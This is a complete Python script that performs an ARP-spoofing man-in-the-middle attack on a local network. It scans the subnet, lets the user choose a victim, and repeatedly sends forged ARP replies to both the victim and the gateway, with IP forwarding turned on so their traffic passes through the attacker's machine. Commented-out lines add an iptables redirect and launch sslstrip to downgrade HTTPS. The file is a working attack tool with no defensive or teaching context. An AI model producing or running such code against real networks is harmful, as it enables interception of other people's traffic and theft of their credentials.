#!/bin/env python3

import time
import socket
import optparse
import ipaddress
import subprocess
import scapy.all as scapy
from colorama import Fore

start_time = time.time()
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_subnet():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
                s.connect(('10.255.255.255', 1))
                ip = s.getsockname()[0]
        except Exception: ip = '127.0.0.1'
        finally: s.close()
        subnet = None
        subnet = "192.168.0.0/24" if ipaddress.ip_address(ip) in ipaddress.ip_network('192.168.0.0/24') else subnet
        subnet = "10.0.2.0/24" if ipaddress.ip_address(ip) in ipaddress.ip_network('10.0.2.0/24') else subnet
        return subnet

def scan(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        results = []
        for item in answered:
                client_dict = {"ip": item[1].psrc, "mac": item[1].hwsrc}
                results.append(client_dict)
        return results

results = scan(get_subnet())
gateway_ip = subprocess.check_output("route -n|sed -n 3p|cut -d ' ' -f10", shell=True).decode().strip('\n')
for result in results:
	if gateway_ip == result["ip"]:
		gateway_mac = result["mac"]

def choose_target():
	subprocess.call("clear", shell=True)
	print("------------" + Fore.YELLOW + " Choose a Target " + Fore.WHITE + "------------")
	global results
	for x in range(len(results)):
		print(str(x) + ") " + results[x]["ip"] + "   [" + results[x]["mac"] + "]")
	try:
		choice = input("\nChoose Target: ")
	except KeyboardInterrupt:
		print(Fore.CYAN + "\n[+]" + Fore.WHITE + " Stopping...")
		subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
		exit(0)
	try:
		int(choice)
	except:
		print(Fore.RED + "[+]" + Fore.WHITE + " Error: Invalid Input!")
		subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
		exit(0)
	if int(choice) in range(len(results)):
		return results[int(choice)]
	else:
		print(Fore.RED + "[+]" + Fore.WHITE + " Error: Choice Invalid!")
		subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
		exit(0)

def spoof(target_ip, target_mac, spoof_ip):
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

target = choose_target()
req_time = 2
symbol_time = 0.2
packets_sent = 0
sym = 1
symbols = {
	1:"|",
	2:"/",
	3:"-",
	4:"\\"
}
#subprocess.call("iptables --flush", shell=True)
#subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)
#subprocess.call("xterm -e 'sslstrip' &", shell=True)
while True:
	try:
		if round(time.time() - start_time) > req_time:
			spoof(target["ip"], target["mac"], gateway_ip)
			spoof(gateway_ip, gateway_mac, target["ip"])
			req_time += 2
			packets_sent += 2

		if round(time.time() - start_time, 1) > symbol_time:
			print(Fore.GREEN + "\r[" + symbols[sym] + "] " + Fore.WHITE + "Packets sent: " + str(packets_sent) + "      " + Fore.WHITE, end='')
			symbol_time += 0.2
			sym += 1
			sym = 1 if sym > 4 else sym

	except KeyboardInterrupt:
		print(Fore.CYAN + "\n[+]" + Fore.WHITE + "Stopping...")
		subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
		restore_packet = scapy.ARP(op=2, pdst=target["ip"], hwdst=target["mac"], psrc=gateway_ip, hwsrc=gateway_mac)
		scapy.send(restore_packet, verbose=False)
		time.sleep(0.5)
		scapy.send(restore_packet, verbose=False)
		exit(0)








